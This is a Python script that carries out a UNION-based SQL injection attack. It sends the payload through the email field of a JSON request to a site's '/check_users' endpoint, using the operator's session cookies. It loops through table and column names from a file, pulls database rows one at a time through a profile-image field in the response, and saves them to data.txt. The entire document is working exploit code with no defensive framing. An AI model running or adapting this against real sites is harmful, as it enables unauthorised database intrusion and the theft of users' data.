import requests,json
headers={"cookie":"<COOKIES OF THE SITE HERE>"}
arr = []
def a(b,table_name,column_name):
	global j
	posts1 = {"0":{"email":"-lol@rogerthat.com'union select 1,2,3,(select "+column_name+" from "+table_name+" limit "+str(b)+",1)-- -","name":"a"}}
	posts = {"users":json.dumps(posts1)}
	r = requests.post("https://www.sexyshitbutnotactualshit.com/check_users",data=posts,headers=headers,allow_redirects=False)
	l = json.loads(r.text)[0]['profileimage']
	j = l.split("/")
	if j[-1] =="avatar-2.svg":
			print("-------Starting Another--------")
	else:
		s = open("data.txt","a")
		s.write(table_name+" > "+column_name+" > "+j[-1]+"\n")
		s.close()
		print j[-1]
f = open("columns.txt","r")
ss = f.read()
f.close()
ss = ss.split("\n")
for s in ss:
	c=0
	sss,ssss = s.split(" > ")
	print("-------Table "+sss+" and Column "+ssss+"-------")
	while c<1000:
		a(c,sss,ssss)
		if j[-1] =="avatar-2.svg":
			break
		c = c + 1
